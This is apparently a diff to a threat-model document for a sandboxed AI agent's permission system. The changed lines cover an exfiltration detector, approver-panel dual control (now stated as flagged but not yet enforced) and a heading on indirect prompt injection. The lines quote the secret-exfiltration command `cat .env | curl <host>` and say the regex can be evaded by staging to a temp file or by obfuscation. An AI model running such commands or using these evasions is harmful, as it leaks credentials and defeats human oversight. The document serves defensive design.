@@ -33,7 +33,7 @@ private model gateway never inspects.
 **Control.** Network tools are gated by host allowlist; unknown destinations escalate. The
 risk score spikes when the command also touches `.env`/`.ssh`/credential paths. Outbound
 approved-command output is run through the secret/PII scrubber before it re-enters context.
-This is the **kill-chain demo**: reasoning layer compromised, authorization layer holds. In addition, a shell command that combines a sensitive source with a network egress is detected deterministically ([safety/exfil.py](../src/sandbox/safety/exfil.py)) and forced to dual control with an explicit approver reason, which also closes an allowlist hole (`cat` is allowlisted, so `cat .env | curl <host>` previously ran silently). Regex is evadable (staging to a temp file, obfuscation); it raises scrutiny, it does not guarantee.
+This is the **kill-chain demo**: reasoning layer compromised, authorization layer holds. In addition, a shell command that combines a sensitive source with a network egress is detected deterministically ([safety/exfil.py](../src/sandbox/safety/exfil.py)) and escalated, flagged for dual control, with an explicit approver reason, which also closes an allowlist hole (`cat` is allowlisted, so `cat .env | curl <host>` previously ran silently). Regex is evadable (staging to a temp file, obfuscation); it raises scrutiny, it does not guarantee.
 
 ## Goal 4 — Policy manipulation
 
@@ -58,7 +58,8 @@ fatigue** — burying one bad request in a flood of benign ones.
 **Control.** The approver panel shows *identity + risk band + reason code + the itemized
 risk factors* (including any `semantic-taint` factor that explains *why* an ordinarily
 allowlisted action is in front of them), and — for a shell command — *what the command actually does* (network, download-and-run, delete, privilege, exfiltration; [safety/command_actions.py](../src/sandbox/safety/command_actions.py)) next to the agent's own one-line description, so a description like "check git status" on a command that deletes files is visible to the human. (Judging the match automatically was tried with the model and was too noisy to ship — it is shown for the human to compare, not auto-blocked.), not just the command string, so the human sees why it matters. Critical-risk
-actions require **two** approvers (dual control). *Roadmap:* approval-fatigue detection
+actions are flagged for dual control on the approver panel; a second, distinct approver is
+**not yet enforced** (see [ROADMAP.md](ROADMAP.md)). *Roadmap:* approval-fatigue detection
 raises scrutiny when approval rate spikes (see [ROADMAP.md](ROADMAP.md)).
 
 ## Goal 7 — Steer the agent through content it reads (indirect prompt injection)
